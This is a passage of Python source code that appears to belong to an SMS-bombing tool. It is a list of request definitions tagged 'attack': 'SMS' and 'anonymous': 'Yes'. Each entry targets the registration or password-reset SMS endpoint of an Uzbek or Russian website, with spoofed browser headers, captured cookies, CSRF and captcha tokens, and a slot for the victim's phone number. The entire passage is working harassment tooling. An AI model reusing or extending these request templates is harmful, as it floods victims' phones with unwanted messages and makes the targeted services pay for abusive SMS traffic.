            'headers': {'Accept': 'application/json', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://beelinetv.uz', 'Referer': 'https://beelinetv.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'username': f'+{number}', 'password': 'oinfsjfsgfgd', 'type': 'msisdn',},
            'params': {'client_id': '3e28685c-fce0-4994-9d3a-1dad2776e16a', 'client_version': '4.3.0-112', 'locale': 'ru-RU', 'timezone': '18000',},
            # Регистрация по номеру
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Beelinetv.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.beelinetv.uz/v1/users/passwords/codes.json',
            'headers': {'Accept': 'application/json', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://beelinetv.uz', 'Referer': 'https://beelinetv.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'username': f'+{number}',},
            'params': {'client_id': '3e28685c-fce0-4994-9d3a-1dad2776e16a', 'client_version': '4.3.0-112', 'locale': 'ru-RU', 'timezone': '18000',},
            # Восстановление пароля по смс коду (если акк есть)
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Insurance.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.insurance.uz/api/code',
            'headers': {'authority': 'api.insurance.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://insurance.uz', 'referer': 'https://insurance.uz/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'phone': str(number)[3:],},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Chipta.Railway.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://chipta.railway.uz/api/v1/auth/registration',
            'cookies': {'_ga': 'GA1.1.271420419.1687274393', '__stripe_mid': 'a98d3605-b69e-48d9-8193-821451c75efd8a3bf7', '__stripe_sid': '2845fa33-6653-4d1a-855a-2d5336a8f40d5767cd', '_ga_K4H2SZ7MWK': 'GS1.1.1687274393.1.1.1687274432.0.0.0', 'G_ENABLED_IDPS': 'google',},
            'headers': {'Accept': 'application/json', 'Accept-Language': 'ru', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://chipta.railway.uz', 'Referer': 'https://chipta.railway.uz/ru/auth/register?redirectURL=', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'captcha-response': '03AL8dmw-Z02aq6PXhM4LMY5JY8GI2kHmhnGGJM8SeDNkgL0ltaCVp83BbhcRruH54I_F1g-_4DwXg1XA8njYwcvXqY4qwyMGv1mstOufneDOd1A--xYDi24m43cLBqBHQimrTyyZYPV0-7nP6NARBN3K9_l1L9ZXoD9qMEIehaBNf8I2dbSgskYEHt-xlV6YIfENwPlYNOjp21KZnamIC2sSert9SDVhsJ6S4DSToD57rJ_R9ySheeSsR-s61sh1f8rW_TXSaxYpOYan-_HyyCQrPzHaqqRX4-8_Hi6LXJjR5e6Szh4s59nzHPNQFS1-V9S3EgLAraMTupgAz1279HUav9kWqBAvzDmqxKsNYObjBxh0l4TTK4QeotM5vjE2yI16gyALoVAnoKEtfa7Yq18XE142nrJITwwuBLLiVRuxBMA1-sNq2x5-RW2Scj2BMhKRs6K_2ICKFXyI5XBSFz8m7F3sLd3x5ES2l93_jt3uwQ_2R9vhm6sDpMfxoMujkxqAyMVDRdDngIH7-SBrbzhRo-SmpoKZg8487jq7Uv4VHelMKtIbOQL8', 'device-type': 'BROWSER', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'username': number, 'password': 'sBR-Xbe-DjL-kWf', 'activationLink': 'https://chipta.railway.uz/auth/activate',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Splay.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.splay.uz/ru/api/v1/user/register/',
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryx2JANBTgzWvGExVn', 'Origin': 'https://splay.uz', 'Referer': 'https://splay.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundaryx2JANBTgzWvGExVn\r\nContent-Disposition: form-data; name="username"\r\n\r\n+{number}\r\n------WebKitFormBoundaryx2JANBTgzWvGExVn\r\nContent-Disposition: form-data; name="password"\r\n\r\nGku-6tY-hxH-8Cw\r\n------WebKitFormBoundaryx2JANBTgzWvGExVn--\r\n',
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Upay.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://capi.upay.uz/rest/ar/prepare_register_user',
            'headers': {'authority': 'capi.upay.uz', 'accept': 'application/json', 'accept-language': 'RU', 'account': '', 'authorization': 'Basic Y2FiaW5ldDpDZGU3NTYjQCFQbE0=', 'content-type': 'application/json; charset=UTF-8', 'origin': 'https://my.upay.uz', 'referer': 'https://my.upay.uz/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'sessionid': '', 'user-agent': user_agent()[1],},
            'json': {'phone': str(number)[3:], 'password': 'RDN-3e6-7uS-BAs', 'retryPassword': 'RDN-3e6-7uS-BAs',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'AgroZamin.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://agrozamin.uz/ru/login',
            'cookies': {'PHPSESSID': 't237db5cfq61f3el7sumhr253q',},
            'headers': {'authority': 'agrozamin.uz', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://agrozamin.uz', 'referer': 'https://agrozamin.uz/ru/login', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': {'LoginPhoneForm[username]': str(number)[3:], 'LoginPhoneForm[password]': 'dgjgnshnshnhf', 'yt0': 'Войти',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Damda.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.damda.uz/api/v1/auth/register',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://damda.uz', 'Referer': 'https://damda.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'phone': number, 'lang': 'ru',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Erkaboyeva.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://erkaboyeva.uz/registration',
            'cookies': {'_csrf-frontend': '35970c65ee7d70cb4b109a24dca26336d1b6e15b47d0dbcd3be2a33e4480cfd6a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22nRJR4K6MiIdt8xO_5UrJTfdBBdpkzpIe%22%3B%7D', '_gid': 'GA1.2.836660128.1687333482', 'advanced-frontend': '0bn02rgeh2uei4356opsc6phdr', '_ga_JT3BS4SG8H': 'GS1.1.1687333482.1.1.1687333534.8.0.0', '_ga': 'GA1.1.2087022085.1687333482',},
            'headers': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://erkaboyeva.uz', 'Referer': 'https://erkaboyeva.uz/registration?phone=%2B99890+921+54+87', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'_csrf-frontend': '0Vk1GVda-RH29ARc1dXcu4PsI-JTcuRipVUEDhkVwby_C39LYxHPXJ-9YCjtrZPktrlRqAcUgCDnMXRlY2WI2Q==', 'phone': f'+{number}',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Dayako.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://dayako.uz/ajax/check-phone',
            'cookies': {'_ym_uid': '1686390976723528011', '_ym_d': '1686390976', '_csrf-dayako': 'd257d4f5b5ebdfbf7148f9a690e3be123c212cede1a7f3a38e67a7ed07885662a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22_csrf-dayako%22%3Bi%3A1%3Bs%3A32%3A%22PQyTJPWX7ohmUKI6kq9Z9drUZdIuS7Zr%22%3B%7D', '_ym_isad': '1', '_ym_visorc': 'w',},
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://dayako.uz', 'Referer': 'https://dayako.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-CSRF-Token': 'pMPTUGplI88qDiXNosrtnV9Kzk54MAkYUUV6dkj8Vx30kqoEIDV0lx1hTaD3gaSrNDv3FEFUe00LITMDG8sNbw==', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'_csrf-dayako': 'pMPTUGplI88qDiXNosrtnV9Kzk54MAkYUUV6dkj8Vx30kqoEIDV0lx1hTaD3gaSrNDv3FEFUe00LITMDG8sNbw==', 'SignupForm[phone]': f'+{str(number)[:3]} {str(number)[3:5]} {str(number)[5:8]}-{str(number)[8:10]}-{str(number)[10:]}',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Megatorg.net', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://megatorg.net/user/register',
            'cookies': {'lng': 'ru', 'bff_geo': '0', 'fpestid': 'KQa-K4bGMoz027BzhAX1-tZVubUJjAwjDlfhrYDFQSUizl2mC5BDeKi3K27cpcHZG47-GA', 'bff_device': 'desktop', '_ym_uid': '1687335173988877771', '_ym_d': '1687335173', '_gid': 'GA1.2.369933185.1687335173', '_ym_isad': '1', '_pk_id.5.3577': 'eff5cd5b14028d19.1687335174.', '_pk_ses.5.3577': '1', '_cc_id': 'c2ba1828642a346ec7bf23d87fb61b20', 'panoramaId_expiry': '1687939995118', 'panoramaId': '0b09bf3bc9435822c5f9d399966f4945a702482cbf05fbb9f767eeb9e2182610', 'panoramaIdType': 'panoIndiv', 'bffssu': 'c23saaajhaaambope42flulto3', '_gat_gtag_UA_175062855_1': '1', '_ga_ZLV7PRPYCQ': 'GS1.1.1687335173.1.1.1687335350.0.0.0', '_ga': 'GA1.1.2002011460.1687335173',},
            'headers': {'authority': 'megatorg.net', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://megatorg.net', 'referer': 'https://megatorg.net/user/register', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'back=https%3A%2F%2Fmegatorg.net%2Fuser%2Flogin&phone=+{number}&agreement=on&uufp=98593514d651080cde0ff362a8f4f074&',
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Quest.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'http://quest.uz/auth',
            'cookies': {'XSRF-TOKEN': 'eyJpdiI6IjloWmVySTlRU1gydDZ1UTRvOXhDY0E9PSIsInZhbHVlIjoiUUFnT2hEMGZtNllmU0gwOHJxNFJDdjFLaFJXeDRtYXNvTWFWN3RiS3RJN3hObHZmZzhLOTNZRFlBeUJlajNpbW5Qb0dKNS9nZkowK2Y2RmlRT0pwWWxrVWs1RWlEMmhtY2VTWSsxSU55MHVpZTRWVjBnUCtaNGFUdFZiVlZrL1UiLCJtYWMiOiJmNTFiZTdlYzk1YmZmOTVmNjI0NWZjMmYzM2MxZGRjOTk5YjM0NTIxZThmY2NkNmJkN2EzYTExNTNmM2U3ZDVjIiwidGFnIjoiIn0%3D', 'laravel_session': 'eyJpdiI6ImY5RWN2Tzh0eUtNa3JGekIrc29uQmc9PSIsInZhbHVlIjoiWXVJa3kzdmJoaDZZMUNoRXpqU2VzTDRPZ0tIZ0F2RDdZbFgwV0RkVnowZ2dtamFGbm10a2xIZmNUcTlHb0pDaXZTQVZCQVc4ckJ6SWJ6bzBYK3BmY0VkV3ZpOXRJc1cwS0hDd3poeFQ2Z2plNG1GYllPOEFBekg2blY0ZnRmb0EiLCJtYWMiOiI5OGQ4NTIzYTY3ODljN2I4NDA3NzlhY2YxYjM4M2QzNDFiMTU3YWZmNTk5Njg0OGZlY2FmYjBmMGNkNjkxODk2IiwidGFnIjoiIn0%3D',},
            'headers': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'http://quest.uz', 'Referer': 'http://quest.uz/auth', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent()[1],},
            'data': {'_token': 'LOHVw642hEkALf4n3dJZhctpT7zekyrNLQBrncfr', 'phone': number, 'code': '', 'action': 'code',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Mato.uz', 'anonymous': 'Yes'},
            'method': 'get',
            'url': 'https://mato.uz/index.php',
            'cookies': {'sid_customer_s_bb71a': '22fbf88ab9f0b461aad63c60a40561b2-C', 'ab__device': 'desktop', '_gcl_au': '1.1.1780750713.1687342800', '_gid': 'GA1.2.1851624924.1687342800', '_gat_UA-171523548-1': '1', '_ga_N00Y26G5BN': 'GS1.1.1687342800.1.1.1687342803.57.0.0', '_ga': 'GA1.1.2012192542.1687342800',},
            'headers': {'authority': 'mato.uz', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'referer': 'https://mato.uz/profiles-add', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'params': {'dispatch': 'profiles.cp_phone_verification', 'otp_type': 'register', 'obj_id': '', 'phone': number, 'result_ids': 'phone_verification_', 'skip_result_ids_check': 'true', 'is_ajax': '1',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'VozzApp.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://vozzapp.uz/ajax/check-phone',
            'cookies': {'_csrf-frontend': 'eb7fc27ddaba72d077a05ad16833cd9cc47774126e1a8d96d1641b988a65b13da%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%229xt127Caan-3_WP2xgIN_GZQWXsIc4Tv%22%3B%7D',},
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://vozzapp.uz', 'Referer': 'https://vozzapp.uz/auth', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-CSRF-Token': 'w12URa7YhGgWW8NTF8wttuwIFMq3D9gckxC41La0ilH6JeB0nO_HCXc17mBIm32ElG9dhOhIgk3ESMud1YDeJw==', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'_csrf-frontend': 'w12URa7YhGgWW8NTF8wttuwIFMq3D9gckxC41La0ilH6JeB0nO_HCXc17mBIm32ElG9dhOhIgk3ESMud1YDeJw==', 'SignupForm[phone]': f'+{str(number)[:3]} {str(number)[3:5]} {str(number)[5:8]}-{str(number)[8:10]}-{str(number)[10:]}',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Essonline.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://essonline.uz/register',
            'cookies': {'_ym_uid': '1686395218224443463', '_ym_d': '1686395218', 'advanced-frontend': '4mjsnbqn8f0v6hng9abhuqru86', '_csrf-frontend': 'a0b7635879c6445fd30b5b886720b180756114c42700ed1ef9ce83f6f719cfe8a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22UpZ2R3X6HFLfr-zZpMVDAECmtiuV6CVH%22%3B%7D', '_ym_isad': '1', '_gid': 'GA1.2.1231806691.1687343996', '_gat_gtag_UA_183747824_1': '1', '_gat_gtag_UA_159041135_1': '1', '_ym_visorc': 'w', '_ga_0PJQNG9XPR': 'GS1.1.1687343996.2.1.1687344001.55.0.0', '_ga': 'GA1.2.748917061.1686395219', '_ga_E999JQR5K9': 'GS1.1.1687343995.2.1.1687344009.46.0.0',},
            'headers': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryYnSydLHQmn3MwMGJ', 'Origin': 'https://essonline.uz', 'Referer': 'https://essonline.uz/register', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundaryYnSydLHQmn3MwMGJ\r\nContent-Disposition: form-data; name="_csrf-frontend"\r\n\r\nv7fBSn2jtY7xtt5n1jh_0nymb0wWTkAM2nvONVyX1Qbqx5t4L5DtuLnwkgGkFQWIDOs5CFcLA2GuErtjatSDTg==\r\n------WebKitFormBoundaryYnSydLHQmn3MwMGJ\r\nContent-Disposition: form-data; name="CheckPhoneForm[phone]"\r\n\r\n+(998)-{str(number)[3:5]}-{str(number)[5:]}\r\n------WebKitFormBoundaryYnSydLHQmn3MwMGJ--\r\n',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Moy-Lvenok.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://moy-lvenok.ru/create-account/',
            'headers': {'authority': 'moy-lvenok.ru', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'cache-control': 'max-age=0', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryYq3AeJLrpFNlFFEH', 'cookie': 'language=ru-ru; currency=RUB; PHPSESSID=029b0bb3121d988d9bae52fb77; _ym_uid=1679381780292889993; _ym_d=1679381780; _ym_isad=1; _ga=GA1.2.92146146.1679381780; _gid=GA1.2.943010286.1679381780; _ym_visorc=w', 'origin': 'https://moy-lvenok.ru', 'referer': 'https://moy-lvenok.ru/create-account/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundaryYq3AeJLrpFNlFFEH\r\nContent-Disposition: form-data; name="firstname"\r\n\r\nUser\r\n------WebKitFormBoundaryYq3AeJLrpFNlFFEH\r\nContent-Disposition: form-data; name="telephone"\r\n\r\n+{number}\r\n------WebKitFormBoundaryYq3AeJLrpFNlFFEH\r\nContent-Disposition: form-data; name="newsletter"\r\n\r\n1\r\n------WebKitFormBoundaryYq3AeJLrpFNlFFEH\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\n03AFY_a8V01I4JtcjuaIUaHnJQVrDQpLg3gGND1DG_IOHKj0JAhN3YsQLDtvbqIpN41wgZ-RxtiumYvZCKjNsQRmJ_wWI1XHD2EZRLfR7YUzt2r3rjenYyqJ9spRLZlhA7lsMPCKJb9_wigSoZqZvTLby9UsTdoPuiIgCf58ZrmvPjdotmcaygYRQU12hVix2MpAfRmAbHc1ejGR7zJsK7_b1tG_KbOEsUrQE8rUrRs7TMYOsm0MmQm5AMxKVlePZyAOrSwMALyQQrqeqimulV4Weve_HS7t5g7UBmQeT8b5azObiSegLqhwo_hdAmptwRsm6g6mUmVvcfn_LcuBHjJW95jFxFtsPWzJOkCPgoZGbZTgprBGFwYsrhLxhGBPLmsMHkzJbev9PQOutIFpoAMsy6XMoGiHaoQxytahbcrA0TmlSIxNNNQvRIEHB9clNn2VkbgDocjHwP-vagAF9iscR0_gmjblPtuMKazLB__pMVJ6guH00OnetwFyJFH-sGKYC8GVOrxeti\r\n------WebKitFormBoundaryYq3AeJLrpFNlFFEH--\r\n',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Rigla.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.rigla.ru/rest/V1/mindbox/account/generateSMS',
            'headers': {'authority': 'www.rigla.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'authorization': 'Bearer tcf5k9a8u7gfyr22c28qu29qq4qhxbu6', 'content-type': 'application/json', 'cookie': '_gcl_au=1.1.1107628409.1679478602; _ym_uid=1679478602779980901; _ym_d=1679478602; _gid=GA1.2.1314938151.1679478602; _ym_visorc=b; mindboxDeviceUUID=3f076512-e2b2-49d7-8c21-6d47ca51c4e9; directCrm-session=%7B%22deviceGuid%22%3A%223f076512-e2b2-49d7-8c21-6d47ca51c4e9%22%7D; _ym_isad=1; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; ACTIVE_CITY=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; ACTIVE_REGION=%7B%22region_id%22%3A77%2C%22region_name%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%22%7D; mobileAppDownloadViewed=true; RIGLA_WEB_SESSION_GUID=315a9859-c085-4dd0-8b16-15c7a7144a89; quoteId=825c21a2e57cea1246ce34d65d556f4c; gtm_url_params={"utm_source":"admitad","utm_medium":"cpa","utm_campaign":"701280","utm_term":"|UIDG39oNj","tagtag_uid":"1b606280f9c6b09840da8dd98ccf2798"}; gtm_source=admitad; gtm_medium=cpa; gtm_campaign=701280; gtm_content=undefined; gtm_term=|UIDG39oNj; tmr_lvid=b3d1fe26b1352d86be7b7dc9b5509006; tmr_lvidTS=1679478606671; tagtag_aid=1b606280f9c6b09840da8dd98ccf2798; tagtag_aid=1b606280f9c6b09840da8dd98ccf2798; tagtag_aid=1b606280f9c6b09840da8dd98ccf2798; tt_deduplication_cookie=adm; tt_deduplication_cookie=adm; tt_deduplication_cookie=adm; _ga_4Q3L9XF45P=GS1.1.1679478604.1.1.1679478609.55.0.0; _ga=GA1.2.137288771.1679478602; tmr_detect=0%7C1679478618204; regionSuggested=1; private_content_version=d30b75a18cb357834c475952c528878e; _gat_UA-37163999-1=1', 'origin': 'https://www.rigla.ru', 'referer': 'https://www.rigla.ru/?utm_source=admitad&utm_medium=cpa&utm_campaign=701280&utm_term=%7CUIDG39oNj&tagtag_uid=1b606280f9c6b09840da8dd98ccf2798', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-app': 'WEB',},
            'json': {'telephone': number, 'recaptcha': '03AFY_a8WZJ21eBP_3yepjoudZYj9Lr7fGaiyG5IpBf53iBNj-iPTk_oo0itfbQzgh28SpskrZwAT0g9Y6QG6WApwPU3PbKXkPdYukwA5qO96iiy3nSez5rtSZcVdSvZiCpvYG95HcD1KWekUSd0nQhzAZHoz7wjstsGDPJQueQj8D6hOUFGj6yvcHm4ULMABJj1gXCVAULioLHUyxZ7RpkSQYf7uOsItN93f-4s66BFmZ2tOr0TKh3vmrKyVkwoZI-z8cFqOuaXAiOWnnM4PzwlsIWzKNBlcsw3mHFTW_a3S6rcOc734U-lcWlhOOTb7Io1Pfjlg7ows8N173VuhE9MYuEFSFvospVtsHVkA_EO41EGEzUyyPHit96LqGFrpYRJV5dA-Qb74rFLDAX36-EOyGFNLSigoPAl1T_YP7HpkgJQMWYs-ubSE4QZU3M6v5VseIY488Pl7owrAqVWGM1F55dqXrvRZmT62kbSNx21_q3FN2S_mkID6YcQcUz0M7gJozM4_WK7gf',},
            # Регистрация на номер телефона (если акка нет)
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Rigla.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.rigla.ru/rest/V1/mindbox/account/resetPassword',
